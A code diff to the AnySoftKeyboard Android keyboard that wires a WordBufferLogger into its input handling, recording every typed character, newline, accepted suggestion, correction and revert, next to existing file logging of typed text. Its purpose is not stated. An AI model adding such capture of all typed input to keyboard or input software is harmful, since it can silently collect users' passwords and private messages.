@@ -98,6 +98,7 @@ import com.menny.android.anysoftkeyboard.BuildConfig;
 import com.menny.android.anysoftkeyboard.FeaturesSet;
 import com.menny.android.anysoftkeyboard.R;
 import com.radicalninja.logger.LoggerUtil;
+import com.radicalninja.logger.WordBufferLogger;
 
 import java.io.FileNotFoundException;
 import java.io.IOException;
@@ -197,6 +198,7 @@ public class AnySoftKeyboard extends InputMethodService implements
     private VoiceRecognitionTrigger mVoiceRecognitionTrigger;
 
     private LoggerUtil mLogger;
+    private WordBufferLogger wordBuffer;
 
     public AnySoftKeyboard() {
         mAskPrefs = AnyApplication.getConfig();
@@ -301,6 +303,7 @@ public class AnySoftKeyboard extends InputMethodService implements
         } catch (FileNotFoundException e) {
             Log.d(LoggerUtil.TAG, "Unable to open LoggerUtil file!", e);
         }
+        wordBuffer = new WordBufferLogger();
     }
 
     private void initSuggest() {
@@ -2218,6 +2221,8 @@ public class AnySoftKeyboard extends InputMethodService implements
             //getting away from firing the default editor action, by forcing newline
             ic.commitText("\n", 1);
 
+            wordBuffer.submitInput("\n");
+
             try {
                 Log.d(LoggerUtil.TAG, "Writing new line [\\n] to log.");
                 mLogger.write("\n");
@@ -2226,6 +2231,8 @@ public class AnySoftKeyboard extends InputMethodService implements
             }
         } else {
             sendKeyChar((char) primaryCode);
+
+            wordBuffer.submitInput(String.valueOf((char) primaryCode));
 
             try {
                 Log.d(LoggerUtil.TAG, "Writing White space: ["+((char) primaryCode)+"]");
@@ -2455,14 +2462,17 @@ public class AnySoftKeyboard extends InputMethodService implements
         }
 
         mWord.setPreferredWord(suggestion);
+
         InputConnection ic = getCurrentInputConnection();
         if (ic != null) {
             if (correcting) {
+                wordBuffer.submitInput(suggestion.toString(), mWord.getTypedWord().toString());
                 AnyApplication.getDeviceSpecific().commitCorrectionToInputConnection(ic, mWord);
                 // and drawing pop-out text
                 mInputView.popTextOutOfKey(mWord.getPreferredWord());
             } else {
                 ic.commitText(suggestion, 1);
+                wordBuffer.submitInput(suggestion.toString());
             }
         }
         mPredicting = false;
@@ -2498,6 +2508,8 @@ public class AnySoftKeyboard extends InputMethodService implements
         Log.d(TAG, "revertLastWord deleteChar:" + deleteChar
                 + ", mWord.size:" + mWord.length() + " mPredicting:"
                 + mPredicting + " mCommittedLength" + mCommittedLength);
+
+        wordBuffer.revertLastInput();
 
         final int length = mWord.length();// mComposing.length();
         if (!mPredicting && length > 0) {
